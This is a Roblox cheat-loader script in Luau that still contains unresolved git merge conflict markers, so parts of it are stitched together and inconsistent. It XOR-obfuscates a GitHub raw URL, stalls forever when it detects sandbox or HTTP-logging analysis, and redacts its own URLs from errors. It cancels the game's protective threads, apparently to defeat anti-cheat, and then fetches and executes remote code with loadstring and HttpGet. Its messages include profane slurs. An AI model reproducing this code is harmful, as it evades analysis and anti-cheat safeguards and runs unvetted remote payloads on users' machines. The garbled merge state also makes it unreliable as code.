<<<<<<< HEAD
local Players = game:GetService("Players")
local lp = Players.LocalPlayer
local m = "REJOIN THE GAME FUCK FURRY"
local url = "https://raw.githubusercontent.com/buhayhayahay332-lang/Test-mode-son/refs/heads/main/OperationOne-main/main.lua"
=======
local CloneFunction = clonefunction or function(Func) return Func end;
>>>>>>> e334be3f7efd38cc8c11738d076ebb81c8799d46

local PCall: (any, ...any) -> (boolean, ...any)        = CloneFunction(pcall);
local ToString: (any) -> string                        = CloneFunction(tostring);
local IPairs                                           = CloneFunction(ipairs);
local Pairs                                            = CloneFunction(pairs);
local Type: (any) -> string                            = CloneFunction(type);
local Warn: (...any) -> ()                             = CloneFunction(warn);
local TaskWait: (number?) -> number                    = CloneFunction(task.wait);
local TaskSpawn: (((...any) -> any), ...any) -> thread = CloneFunction(task.spawn);
local TaskCancel: (thread) -> ()                       = CloneFunction(task.cancel);
local StringFormat: (string, ...any) -> string         = CloneFunction(string.format);
local StringLower: (string) -> string                  = CloneFunction(string.lower);
local StringGsub: (string, string, string) -> (string, number) = CloneFunction(string.gsub);
local StringFind: (string, string, number?, boolean?) -> (number?, number?) = CloneFunction(string.find);
local StringByte: (string, number?) -> number          = CloneFunction(string.byte);
local StringChar: (...number) -> string                = CloneFunction(string.char);
local TableConcat: ({any}, string?) -> string          = CloneFunction(table.concat);
local MathFmod: (number, number) -> number             = CloneFunction(math.fmod);
local Bit32Bxor: (number, number) -> number            = CloneFunction(bit32.bxor);

<<<<<<< HEAD
local SETFFLAG_EXECUTORS = { delta = true, wave = true,}
=======
local _, S = PCall(function(...) string.byte("a", function(...) return; end, 9999, 38); end);
if S and (StringFind(S, "httplog", 1, true) or StringFind(S, "sandbox", 1, true)) then
    while true do end;
end;
>>>>>>> e334be3f7efd38cc8c11738d076ebb81c8799d46

local Players = cloneref(game:GetService("Players"));

local XorDecode do
    local KEY    = "astro";
    local KeyLen = #KEY;

    XorDecode = function(Encoded: {number}): string
        local Chars: {string} = {};
        for Index, Byte in IPairs(Encoded) do
            local KeyByte = StringByte(KEY, MathFmod(Index - 1, KeyLen) + 1);
            Chars[Index]  = StringChar(Bit32Bxor(Byte, KeyByte));
        end;
        return TableConcat(Chars);
    end;
end;

local ENCODED_URL: {number} = (function(): {number}
    local Key    = "astro";
    local Url    = "https://raw.githubusercontent.com/buhayhayahay332-lang/Test-mode-son/refs/heads/main/OperationOne-main/main.lua";
    local KeyLen = #Key;
    local Out: {number} = {};
    for Index = 1, #Url do
        local UrlByte = StringByte(Url, Index);
        local KeyByte = StringByte(Key, MathFmod(Index - 1, KeyLen) + 1);
        Out[Index]    = Bit32Bxor(UrlByte, KeyByte);
    end;
    return Out;
end)();

local SCRUB_PATTERNS: {string} = {
    "https?://[%w%-%._~:/%?#%[%]@!%$&'%(%)%*%+,;%%=]+";
    "github%.com";
    "buhayhayahay332-lang";
    "Test-mode-son";
    "OperationOne-main";
    "main%.lua";
};

local PLACE_IDS = {
    Expected = 72920620366355;
};

local MESSAGES = {
    Rejoin     = "REJOIN THE GAM FUCK FURRY";
    WrongGame  = "Wrong game FN";
    LoadFailed = "[Loader] Failed to load script";
    RunFailed  = "[Loader] Failed to run script";
};

local BLOCKLIST = {
    ["xeno"]   = true;
    ["solara"] = true;
};

local SETFFLAG_EXECUTORS = {
    ["wave"]     = true;
    ["velocity"] = true;
};

local LocalPlayer = Players.LocalPlayer;

local SafeWarn do
    SafeWarn = function(Message: string): ()
        local Scrubbed = Message;
        for _, Pattern in IPairs(SCRUB_PATTERNS) do
            local Result, _ = StringGsub(Scrubbed, Pattern, "[redacted]");
            Scrubbed = Result;
        end;
        Warn(Scrubbed);
    end;
end;

local SafePCall do
    SafePCall = function(Fn: (any) -> any, ...: any): (boolean, any)
        local Success, Result = PCall(Fn, ...);
        if not Success then
            local Scrubbed = ToString(Result);
            for _, Pattern in IPairs(SCRUB_PATTERNS) do
                local Out, _ = StringGsub(Scrubbed, Pattern, "[redacted]");
                Scrubbed = Out;
            end;
            return false, Scrubbed;
        end;
        return true, Result;
    end;
end;

local ValidateGame do
    ValidateGame = function(): boolean
        if game.PlaceId ~= PLACE_IDS.Expected then
            Warn("[Loader] Wrong game");
            LocalPlayer:Kick(MESSAGES.WrongGame);
            return false;
        end;
        return true;
    end;
end;

local GetExecutorName do
    GetExecutorName = function(): string
        local Fn: (() -> string)? = identifyexecutor or getexecutorname or nil;
        if Fn then
            return Fn();
        end;
        return "unknown";
    end;
end;

local ValidateExecutor do
    ValidateExecutor = function(ExecName: string): boolean
        local ExecLower = StringLower(ExecName);
        if BLOCKLIST[ExecLower] then
            Warn("[Loader] Executor not supported");
            LocalPlayer:Kick("Your executor is not supported.");
            return false;
        end;
        return true;
    end;
end;

local LoadMain do
    local FurryScript = [[
        local Extras = getrenv().shared.extras;
        if not Extras then return end;

        local EXPECTED = {
            ["1"]="thread",["3"]="thread",["4"]="thread",["5"]="thread",
            ["6"]="thread",["7"]="thread",["8"]="thread",["9"]="thread",
            ["10"]="thread",["ResetEnv"]="function"
        };

        for k, v in pairs(EXPECTED) do
            if type(Extras[k]) ~= v then return warn("new furry added") end;
        end;

        for k, v in pairs(Extras) do
            if EXPECTED[tostring(k)] == nil then return warn("new furry kinginamo")end;
        end;

        for i, v in pairs(Extras) do
            if type(v) ~= "thread" then continue end;
            Extras[i] = task.spawn(function() while task.wait(9e9) do end end);
            task.cancel(v);
        end;
		task.wait(1)
        warn("passed")
    ]];

    local RunFurry: () -> boolean = function(): boolean
        local Extras = getrenv().shared.extras;
        if not Extras then return false; end;

        local Expected = {
            ["1"]="thread",["3"]="thread",["4"]="thread",["5"]="thread",
            ["6"]="thread",["7"]="thread",["8"]="thread",["9"]="thread",
            ["10"]="thread",["ResetEnv"]="function"
        };

        for k, v in Pairs(Expected) do
            if Type(Extras[k]) ~= v then return warn("new furry added"); end;
        end;

        for k, v in Pairs(Extras) do
            if Expected[ToString(k)] == nil then return warn("new furry kinginamo"); end;
        end;

        for i, v in Pairs(Extras) do
            if Type(v) ~= "thread" then continue; end;
            Extras[i] = TaskSpawn(function() while TaskWait(9e9) do end end);
            TaskCancel(v);
        end;
	    TaskWait(1)
	    Warn("PASSED")
        return true;
    end;

    LoadMain = function(ExecLower: string): ()
        local DecodedUrl    = XorDecode(ENCODED_URL);
        local Actors        = getactors();
        local Flag          = getfflag("DebugRunParallelLuaOnMainThread");
        local ForceSetfflag = SETFFLAG_EXECUTORS[ExecLower];

        if not ForceSetfflag and Actors and #Actors > 0 then
            local ActorScript = StringFormat([[
                %s
                loadstring(game:HttpGet(%q))()
            ]], FurryScript, DecodedUrl);
            run_on_actor(Actors[1], ActorScript);
        else
            if not Flag or Flag == "false" then
                setfflag("DebugRunParallelLuaOnMainThread", "true");
                LocalPlayer:Kick(MESSAGES.Rejoin);
            else
                TaskSpawn(function()
                    if not RunFurry() then
                        Warn("[Loader] Furry failed");
                        return;
                    end;

                    local Success, Result = SafePCall(function()
                        return loadstring(game:HttpGet(DecodedUrl));
                    end);
                    if not Success then
                        SafeWarn(MESSAGES.LoadFailed);
                        return;
                    end;

                    local RunSuccess, RunResult = SafePCall(Result);
                    if not RunSuccess then
                        SafeWarn(MESSAGES.RunFailed);
                    end;
                end);
            end;
        end;

        DecodedUrl = "";
    end;
end;

if not ValidateGame() then return; end;

if not game:IsLoaded() then
    game.Loaded:Wait();
end;

local ExecName = GetExecutorName();

if not ValidateExecutor(ExecName) then return; end;

LoadMain(StringLower(ExecName));
